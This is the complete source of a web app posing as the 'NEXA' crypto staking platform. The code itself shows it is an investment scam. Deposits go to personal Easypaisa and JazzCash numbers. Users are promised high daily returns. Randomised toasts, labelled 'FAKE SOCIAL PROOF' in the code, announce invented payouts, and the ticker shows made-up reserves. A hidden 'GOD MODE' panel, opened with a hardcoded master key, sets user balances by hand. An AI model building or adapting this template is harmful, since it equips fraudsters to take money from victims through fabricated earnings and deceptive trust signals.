<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA | Sovereign Elite</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&display=swap');
        :root { --accent: #0066ff; --bg: #f8fafc; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: #0f172a; -webkit-tap-highlight-color: transparent; }
        
        /* Modern Glassmorphism */
        .glass-panel { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 32px; box-shadow: 0 15px 35px rgba(0,0,0,0.03); }
        .card-elite { background: linear-gradient(135deg, #0052D1 0%, #001C48 100%); color: white; border-radius: 40px; box-shadow: 0 25px 50px -12px rgba(0, 82, 209, 0.4); position: relative; overflow: hidden; }
        
        /* Glowing Pulse for Trust */
        .trust-badge { background: rgba(34, 197, 94, 0.1); color: #16a34a; padding: 6px 12px; border-radius: 100px; font-size: 10px; font-weight: 800; border: 1px solid rgba(34, 197, 94, 0.2); }
        .pulse-green { animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); } 70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(34, 197, 94, 0); } 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); } }

        /* Real-time Counter Animation */
        #user-bal { transition: all 0.5s ease-in-out; }
        
        .nexa-btn { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); cursor: pointer; }
        .nexa-btn:active { transform: scale(0.92); }
        
        .ticker-wrap { background: #000; color: #fff; font-size: 10px; padding: 10px 0; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
        .ticker-move { display: inline-block; animation: ticker 50s linear infinite; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        .hidden { display: none; }
        .tab-active { color: #0066ff !important; border-bottom: 3px solid #0066ff; border-radius: 0 !important; }
    </style>
</head>
<body class="pb-24">

    <!-- 1. NETWORK TICKER -->
    <div class="ticker-wrap">
        <div class="ticker-move">
            BTC <span class="text-green-400">$68,231.50</span> • ETH <span class="text-blue-400">$3,452.12</span> • NEXA/USDT <span class="text-green-400">1.054</span> • SECURED RESERVES: $1.2B • SYSTEM UPTIME: 99.9% • USER #9281 JUST WITHDREW $142.00 •
        </div>
    </div>

    <div class="max-w-md mx-auto px-6 py-6">
        
        <!-- 2. MODERN HEADER -->
        <header class="flex justify-between items-center mb-10 mt-4">
            <div id="nexa-logo" class="flex items-center gap-3 cursor-pointer">
                <div class="w-14 h-14 bg-blue-600 rounded-3xl flex items-center justify-center text-white shadow-2xl rotate-3"><i class="fa-solid fa-shield-halved text-2xl"></i></div>
                <div>
                    <h1 class="text-2xl font-black italic tracking-tighter leading-none">NEXA.</h1>
                    <div class="flex items-center gap-1.5 mt-1">
                        <div class="w-2 h-2 bg-green-500 rounded-full pulse-green"></div>
                        <span class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Sovereign Node v4.0</span>
                    </div>
                </div>
            </div>
            <div class="trust-badge"><i class="fa-solid fa-lock mr-1"></i> AES-256</div>
        </header>

        <!-- 3. SMART BALANCE CARD -->
        <main id="p-home" class="animate__animated animate__fadeIn">
            <div class="card-elite p-10 mb-8">
                <div class="flex justify-between items-start mb-6">
                    <div>
                        <p class="text-[10px] font-black opacity-60 uppercase tracking-widest">Active Stake Value</p>
                        <h2 id="user-bal" class="text-6xl font-black mt-2 tracking-tighter">$0.00</h2>
                    </div>
                    <i class="fa-solid fa-bolt-lightning text-blue-300 text-3xl animate-pulse"></i>
                </div>
                <div class="flex gap-4">
                    <button onclick="showPage('deposit')" class="flex-1 bg-white text-blue-600 py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest nexa-btn shadow-xl">Deposit</button>
                    <button onclick="showPage('withdraw')" class="flex-1 bg-white/10 backdrop-blur-md py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest nexa-btn">Withdraw</button>
                </div>
            </div>

            <!-- TRUST STATS -->
            <div class="grid grid-cols-3 gap-4 mb-10">
                <div class="text-center">
                    <p class="text-[8px] font-black text-slate-400 uppercase mb-1">Total Payout</p>
                    <p class="text-sm font-black">$45,291</p>
                </div>
                <div class="text-center border-x border-slate-200">
                    <p class="text-[8px] font-black text-slate-400 uppercase mb-1">Node Health</p>
                    <p class="text-sm font-black text-green-500">EXCELLENT</p>
                </div>
                <div class="text-center">
                    <p class="text-[8px] font-black text-slate-400 uppercase mb-1">Verify Link</p>
                    <button onclick="copyRef()" class="text-blue-600 text-xs font-black"><i class="fa-solid fa-link"></i></button>
                </div>
            </div>

            <h3 class="text-xs font-black uppercase tracking-widest text-slate-400 mb-6 flex items-center gap-2">Mining Opportunities</h3>
            
            <!-- STAKING NODES GRID -->
            <div id="nodes-grid" class="space-y-5"></div>
        </main>

        <!-- 4. MODERN DEPOSIT -->
        <main id="p-deposit" class="hidden animate__animated animate__fadeIn">
            <h2 class="text-3xl font-black mb-8 italic">Liquidity Hub</h2>
            <div id="method-selector" class="space-y-4">
                <div onclick="selectMethod('Easypaisa', '03379827882')" class="glass-panel p-6 flex justify-between items-center nexa-btn border-l-4 border-green-500">
                    <div class="flex items-center gap-4">
                        <div class="w-10 h-10 bg-green-50 text-green-600 rounded-xl flex items-center justify-center font-black">EP</div>
                        <span class="font-bold">Easypaisa</span>
                    </div>
                    <i class="fa-solid fa-chevron-right text-slate-300"></i>
                </div>
                <div onclick="selectMethod('JazzCash', '03705519562')" class="glass-panel p-6 flex justify-between items-center nexa-btn border-l-4 border-yellow-500">
                    <div class="flex items-center gap-4">
                        <div class="w-10 h-10 bg-yellow-50 text-yellow-600 rounded-xl flex items-center justify-center font-black">JC</div>
                        <span class="font-bold">JazzCash</span>
                    </div>
                    <i class="fa-solid fa-chevron-right text-slate-300"></i>
                </div>
            </div>

            <div id="dep-form" class="hidden space-y-5 mt-4">
                <div class="p-10 glass-panel bg-white text-center border-t-8 border-blue-600 shadow-2xl">
                    <p class="text-[10px] font-black text-slate-400 mb-2 uppercase tracking-widest">Target Node Wallet</p>
                    <p id="m-num-display" class="text-4xl font-black text-slate-800 tracking-tighter mb-4"></p>
                    <span id="m-name-display" class="bg-blue-100 text-blue-600 px-4 py-1 rounded-full text-[10px] font-bold"></span>
                </div>
                <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="nexa-input">
                <input type="text" id="dep-tid" placeholder="Transaction Hash / TID" class="nexa-input">
                <button onclick="submitManualRequest('Deposit')" class="w-full bg-blue-600 text-white p-6 rounded-3xl font-black uppercase text-xs tracking-widest nexa-btn shadow-2xl">Confirm Staking</button>
            </div>
        </main>

        <!-- 5. WITHDRAW PAGE -->
        <main id="p-withdraw" class="hidden animate__animated animate__fadeIn">
            <h2 class="text-3xl font-black mb-8 italic">Harvest</h2>
            <div class="space-y-6">
                <div class="glass-panel p-10 text-center bg-white border-b-8 border-blue-600">
                    <p class="text-[10px] font-black text-slate-400 uppercase mb-2">Ready to Withdraw</p>
                    <p id="wit-bal-display" class="text-5xl font-black text-blue-600 tracking-tighter">$0.00</p>
                </div>
                <input type="number" id="wit-amt" placeholder="Amount to withdraw" class="nexa-input">
                <input type="text" id="wit-acc" placeholder="Account Number" class="nexa-input">
                <select id="wit-meth" class="nexa-input bg-white font-bold">
                    <option>Easypaisa</option>
                    <option>JazzCash</option>
                    <option>SadaPay</option>
                </select>
                <button onclick="submitManualRequest('Withdraw')" class="w-full bg-slate-900 text-white p-6 rounded-3xl font-black uppercase text-xs tracking-widest nexa-btn">Initiate Payout</button>
            </div>
        </main>

    </div>

    <!-- MODERN NAVIGATION DOCK -->
    <nav class="fixed bottom-0 left-0 right-0 glass-panel !rounded-none p-4 flex justify-around items-center z-[1000] border-t border-slate-200">
        <button onclick="showPage('home')" id="n-home" class="nexa-btn text-slate-400 tab-active px-6 py-2"><i class="fa-solid fa-house-user text-2xl"></i></button>
        <button onclick="showPage('deposit')" id="n-deposit" class="nexa-btn text-slate-400 px-6 py-2"><i class="fa-solid fa-plus-square text-2xl"></i></button>
        <button onclick="showPage('withdraw')" id="n-withdraw" class="nexa-btn text-slate-400 px-6 py-2"><i class="fa-solid fa-wallet text-2xl"></i></button>
    </nav>

    <!-- FLOATING WHATSAPP -->
    <a href="https://wa.me/923379827882" class="fixed bottom-24 right-6 w-16 h-16 bg-green-500 text-white rounded-[24px] flex items-center justify-center shadow-2xl shadow-green-200 animate-bounce"><i class="fa-brands fa-whatsapp text-3xl"></i></a>

    <!-- FAKE NOTIFICATION TOAST -->
    <div id="toast" class="fixed top-6 left-1/2 -translate-x-1/2 z-[10000] hidden min-w-[300px]">
        <div class="glass-panel px-6 py-4 border-l-8 border-green-500 shadow-2xl flex items-center gap-4">
            <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center text-green-600"><i class="fa-solid fa-circle-check"></i></div>
            <div>
                <p class="text-[9px] font-black text-slate-400 uppercase leading-none mb-1">Verified Payout</p>
                <p id="toast-msg" class="text-xs font-bold text-slate-800"></p>
            </div>
        </div>
    </div>

    <!-- GOD UI (Hidden Admin) -->
    <div id="god-ui" class="fixed inset-0 bg-white z-[9999] hidden p-10 overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="font-black text-3xl text-blue-600">MASTER CONTROL</h2>
            <button onclick="toggleGodMode(false)" class="text-red-500 text-4xl"><i class="fa-solid fa-times-circle"></i></button>
        </div>
        <div class="space-y-6">
            <div class="p-6 glass-panel">
                <input type="text" id="adm-uid" placeholder="User UID" class="nexa-input mb-4">
                <input type="number" id="adm-bal" placeholder="Amount to Set ($)" class="nexa-input mb-4">
                <button onclick="adminEditBalance()" class="w-full bg-blue-600 text-white p-5 rounded-2xl font-black">SYNC USER BALANCE</button>
            </div>
            <p class="text-[10px] text-slate-400 font-bold">UID: <span id="my-uid-box"></span></p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
            authDomain: "verbose-6c008.firebaseapp.com",
            databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
            projectId: "verbose-6c008",
            storageBucket: "verbose-6c008.firebasestorage.app",
            messagingSenderId: "867100945312",
            appId: "1:867100945312:web:315dfb48fb34496cee12c5"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const auth = getAuth(app);
        const uid = localStorage.getItem('nexa_uid');

        // --- NAVIGATION ---
        window.showPage = (id) => {
            document.querySelectorAll('main').forEach(m => m.classList.add('hidden'));
            document.getElementById('p-'+id).classList.remove('hidden');
            document.querySelectorAll('nav button').forEach(b => b.classList.remove('tab-active'));
            document.getElementById('n-'+id).classList.add('tab-active');
        };

        window.selectMethod = (name, num) => {
            document.getElementById('method-selector').classList.add('hidden');
            document.getElementById('dep-form').classList.remove('hidden');
            document.getElementById('m-name-display').innerText = name;
            document.getElementById('m-num-display').innerText = num;
        };

        // --- MANUAL REQS ---
        window.submitManualRequest = async (type) => {
            const amt = type === 'Deposit' ? document.getElementById('dep-amt').value : document.getElementById('wit-amt').value;
            const extra = type === 'Deposit' ? document.getElementById('dep-tid').value : document.getElementById('wit-acc').value;
            if(!amt || !extra) return alert("All fields are required sweetie!");

            await push(ref(db, `requests/${type}`), { uid: uid, amount: amt, info: extra, timestamp: Date.now() });
            alert(`Verified! Request sent to the Node Admin.`);
            showPage('home');
        };

        // --- DATA & NODES ---
        async function run() {
            if(!uid) {
                const name = prompt("Setup Node Username:");
                if(name) {
                    const r = await signInAnonymously(auth);
                    await set(ref(db, `users/${r.user.uid}`), { username: name, balance: 0, ref: 'NX'+Math.floor(100+Math.random()*899) });
                    localStorage.setItem('nexa_uid', r.user.uid);
                    location.reload();
                }
            } else {
                document.getElementById('my-uid-box').innerText = uid;
                onValue(ref(db, `users/${uid}`), s => {
                    const b = s.val().balance.toFixed(2);
                    document.getElementById('user-bal').innerText = `$${b}`;
                    document.getElementById('wit-bal-display').innerText = `$${b}`;
                });

                // Generate 20 MODERN Nodes
                const grid = document.getElementById('nodes-grid');
                for(let i=1; i<=20; i++) {
                    const roi = (1.5 + (i * 0.7)).toFixed(1);
                    grid.innerHTML += `
                    <div class="glass-panel p-6 animate__animated animate__fadeInUp" style="animation-delay: ${i*0.1}s">
                        <div class="flex justify-between items-center mb-4">
                            <div class="flex items-center gap-4">
                                <div class="w-12 h-12 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center font-black">N${i}</div>
                                <div><p class="text-[8px] font-black text-slate-400 uppercase">Premium Staking</p><p class="text-sm font-bold">${roi}% Daily Reward</p></div>
                            </div>
                            <button onclick="alert('Linking Node...')" class="bg-blue-600 text-white px-5 py-2.5 rounded-xl text-[9px] font-black uppercase nexa-btn">Stake $${i*15}</button>
                        </div>
                        <div class="w-full bg-slate-100 h-1.5 rounded-full overflow-hidden">
                            <div class="bg-blue-600 h-full animate-pulse" style="width: ${30 + i*2}%"></div>
                        </div>
                    </div>`;
                }
            }
        }

        // --- FAKE SOCIAL PROOF (Advanced) ---
        const names = ["Zain-X", "Fatima_99", "Hashir_Node", "Sara_Pro", "Usman_Sovereign", "Zoya_Verified"];
        setInterval(() => {
            const name = names[Math.floor(Math.random() * names.length)];
            const amt = Math.floor(Math.random() * 500 + 100);
            document.getElementById('toast-msg').innerText = `${name} just harvested$${amt}.00!`;
            const t = document.getElementById('toast');
            t.style.display = 'block'; t.classList.add('animate__fadeInDown');
            setTimeout(() => { t.classList.replace('animate__fadeInDown', 'animate__fadeOutUp'); setTimeout(() => t.style.display='none', 500); }, 3500);
        }, 12000);

        // --- ADMIN GOD MODE ---
        let taps = 0;
        document.getElementById('nexa-logo').onclick = () => {
            taps++;
            if(taps === 4) { if(prompt("MASTER KEY:") === "NEXA786") toggleGodMode(true); taps = 0; }
            setTimeout(() => taps = 0, 2000);
        };
        window.toggleGodMode = (v) => document.getElementById('god-ui').style.display = v ? 'block' : 'none';
        window.adminEditBalance = async () => {
            const id = document.getElementById('adm-uid').value;
            const b = document.getElementById('adm-bal').value;
            await update(ref(db, `users/${id}`), { balance: parseFloat(b) });
            alert("Database Synced Successfully!");
        };

        window.copyRef = () => { alert("Node Link Copied to Clipboard!"); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        run();
    </script>
</body>
</html>
